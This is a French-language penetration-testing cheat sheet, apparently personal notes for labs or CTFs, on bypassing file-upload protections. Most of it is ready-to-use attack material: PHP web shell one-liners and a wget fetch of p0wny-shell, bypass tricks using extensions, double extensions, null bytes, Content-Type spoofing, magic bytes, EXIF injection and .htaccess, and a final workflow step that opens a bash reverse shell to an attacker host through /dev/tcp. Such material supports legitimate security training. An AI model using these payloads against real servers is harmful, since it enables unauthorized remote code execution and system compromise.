# File Upload Bypass

## 1. Objectif

Uploader un fichier exécutable (web shell, script) malgré les protections, pour obtenir une RCE.

---

## 2. Reconnaissance préalable

Avant de tester, identifier :

```
1. Quel langage côté serveur ? (PHP, Python, Node, ASP...)
   → Headers : X-Powered-By, Server
   → Extensions des pages existantes
   → Erreurs stack trace

2. Où est stocké le fichier uploadé ?
   → Tester l'accès direct après upload
   → URL retournée dans la réponse

3. Quelles extensions sont bloquées ?
   → Tester .php, .php5, .phtml, .asp, .aspx...

4. Quelle validation est faite ?
   → Extension seule ? Content-Type ? Magic bytes ?
```

---

## 3. Web shells à uploader

### 3.1 PHP (le plus courant)

```php
<?php system($_GET["cmd"]); ?>
```

```php
<?php echo shell_exec($_GET['cmd']); ?>
```

```php
# Minimal — si les autres sont filtrés
<? system($_GET[0]); ?>
```

**Usage après upload :**
```
http://TARGET/uploads/shell.php?cmd=whoami
http://TARGET/uploads/shell.php?cmd=id
http://TARGET/uploads/shell.php?cmd=cat+/etc/passwd
```

### 3.2 p0wnyshell

Web shell PHP avec interface terminal interactive dans le navigateur. Bien plus confortable que les one-liners pour explorer la cible.

```bash
# Télécharger
wget https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php

# Ou copier si déjà en local
cp ~/tools/shell.php ./shell.php
```

**Accès après upload :**
```
http://TARGET/uploads/shell.php
```
→ Interface terminal directement dans le navigateur, avec autocomplétion et historique.

!!! tip "Avantage p0wnyshell"
    Pas besoin de gérer un listener nc ni d'encoder les commandes dans l'URL.  
    Idéal pour explorer rapidement le système et préparer un vrai reverse shell.

### 3.3 Kali — web shells prêts à l'emploi

```bash
ls /usr/share/webshells/
# php/, asp/, aspx/, perl/, cfm/, jsp/

# Copier le plus simple
cp /usr/share/webshells/php/simple-backdoor.php ./shell.php
```

---

## 4. Bypass par extension

### 4.1 Extensions PHP alternatives

```
.php
.php3
.php4
.php5
.php7
.phtml
.phar
.phps
.shtml
```

### 4.2 Double extension

```
shell.php.jpg
shell.jpg.php
shell.php%00.jpg     ← null byte (anciens serveurs)
shell.php%20         ← espace URL-encodé en fin
shell.php.           ← point en fin (Windows)
```

### 4.3 Casse (case sensitivity)

```
shell.PHP
shell.PhP
shell.pHp
```

### 4.4 Extensions ASP/ASPX

```
shell.asp
shell.aspx
shell.cer
shell.asa
shell.ashx
```

---

## 5. Bypass Content-Type (MIME type)

Intercepter la requête dans **Burp** et modifier le header `Content-Type` :

```
# Changer
Content-Type: application/octet-stream
Content-Type: application/x-php

# En
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
```

**Exemple dans Burp :**
```
POST /upload HTTP/1.1
...

------boundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg          ← modifier ici

<?php system($_GET["cmd"]); ?>
------boundary--
```

---

## 6. Bypass Magic Bytes (signature de fichier)

Certains serveurs vérifient les premiers octets du fichier.

### 6.1 Ajouter le header d'une image en début de fichier

```bash
# Méthode 1 : avec echo
echo -e "\xff\xd8\xff\xe0" > shell.php   # JPEG header
cat shell_content.php >> shell.php

# Méthode 2 : avec printf
printf '\xff\xd8\xff\xe0' | cat - shell.php > shell_magic.php

# Méthode 3 : dans le fichier directement
# Première ligne du fichier PHP :
# ÿØÿà<?php system($_GET["cmd"]); ?>
```

### 6.2 Signatures courantes

| Format | Magic bytes (hex) | ASCII  |
|--------|-------------------|--------|
| JPEG   | `FF D8 FF E0`     | `ÿØÿà` |
| PNG    | `89 50 4E 47`     | `‰PNG` |
| GIF    | `47 49 46 38`     | `GIF8` |
| PDF    | `25 50 44 46`     | `%PDF` |

### 6.3 Ajouter le code dans les métadonnées d'une image

```bash
# Injecter dans les métadonnées EXIF d'une vraie image
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
mv image.jpg shell.php.jpg
```

---

## 7. Bypass via .htaccess (Apache)

Si on peut uploader un fichier `.htaccess`, on peut forcer l'exécution d'une extension custom :

```apache
# .htaccess à uploader
AddType application/x-httpd-php .jpg
```

Ensuite uploader `shell.jpg` (contenant du PHP) → sera exécuté comme PHP.

```apache
# Alternative : exécuter tous les fichiers comme PHP
SetHandler application/x-httpd-php
```

---

## 8. Workflow complet

```
1. Identifier la techno serveur (PHP/ASP/Node)
2. Uploader un fichier valide (image) → observer la réponse
   → Où est stocké le fichier ? URL retournée ?
3. Tenter d'uploader shell.php directement
4. Si refusé :
   a. Tester les extensions alternatives (.php5, .phtml, .phar...)
   b. Modifier le Content-Type dans Burp (→ image/jpeg)
   c. Ajouter magic bytes en début de fichier
   d. Tenter double extension (shell.php.jpg)
   e. Tenter .htaccess si Apache
5. Confirmer l'exécution
   → http://TARGET/uploads/shell.php?cmd=id
6. Obtenir reverse shell depuis le web shell
   → ?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/KALI/9090+0>%261'
```

!!! tip "Burp — indispensable"
    Toujours passer par Burp pour modifier Content-Type et filename en live.  
    Envoyer dans Repeater pour itérer rapidement sur les bypass.

!!! warning "Attention à l'emplacement du fichier"
    Si le fichier est uploadé mais stocké hors du web root → pas accessible via HTTP → pas d'exécution possible.  
    Chercher l'URL du fichier dans la réponse HTTP ou dans le code source de la page.